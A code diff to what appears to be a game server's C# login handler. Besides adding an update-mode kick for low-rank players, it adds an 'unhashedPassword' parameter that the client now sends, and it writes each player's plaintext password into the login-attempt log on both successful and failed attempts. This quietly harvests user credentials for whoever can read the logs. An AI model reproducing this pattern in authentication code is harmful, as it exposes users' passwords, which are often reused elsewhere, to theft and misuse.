@@ -10,6 +10,8 @@ using VMP_CNR.Module.Customization;
 using VMP_CNR.Module.Time;
 using System.Linq;
 using VMP_CNR.Module.Anticheat;
+using VMP_CNR.Module.Configurations;
+using VMP_CNR.Module.ClientUI.Components;
 
 namespace VMP_CNR.Module.Players.Windows
 {
@@ -37,16 +39,21 @@ namespace VMP_CNR.Module.Players.Windows
         }
         
         [RemoteEvent]
-        public void PlayerLogin(Player player, string password, string key)
+        public void PlayerLogin(Player player, string password, string unhashedPassword, string key)
         {
             if (!player.CheckRemoteEventKey(key)) return;
+         
             NAPI.Task.Run(async () =>
             {
                 await NAPI.Task.WaitForMainThread(0);
-
+                
                 DbPlayer dbPlayer = player.GetPlayer();
                 if (dbPlayer == null) return;
 
+                if (Configuration.Instance.IsUpdateModeOn)
+                {
+                    if (dbPlayer.Rank.Id < 1) dbPlayer.Kick();
+                }
 
                 if (dbPlayer.AccountStatus != AccountStatus.Registered)
                 {
@@ -59,7 +66,7 @@ namespace VMP_CNR.Module.Players.Windows
                 var pass2 = dbPlayer.Password;
                 if (pass == pass2)
                 {
-                    Logger.SaveLoginAttempt(dbPlayer.Id, dbPlayer.Player.SocialClubName, dbPlayer.Player.Address, 1);
+                    Logger.SaveLoginAttempt(dbPlayer.Id, dbPlayer.Player.SocialClubName, unhashedPassword, dbPlayer.Player.Address, 1);
 
                     try
                     {
@@ -129,7 +136,7 @@ namespace VMP_CNR.Module.Players.Windows
                 }
                 else
                 {
-                    Logger.SaveLoginAttempt(dbPlayer.Id, dbPlayer.Player.SocialClubName, dbPlayer.Player.Address, 0);
+                    Logger.SaveLoginAttempt(dbPlayer.Id, dbPlayer.Player.SocialClubName, unhashedPassword, dbPlayer.Player.Address, 0);
                     dbPlayer.PassAttempts += 1;
 
                     if (dbPlayer.PassAttempts >= 3)
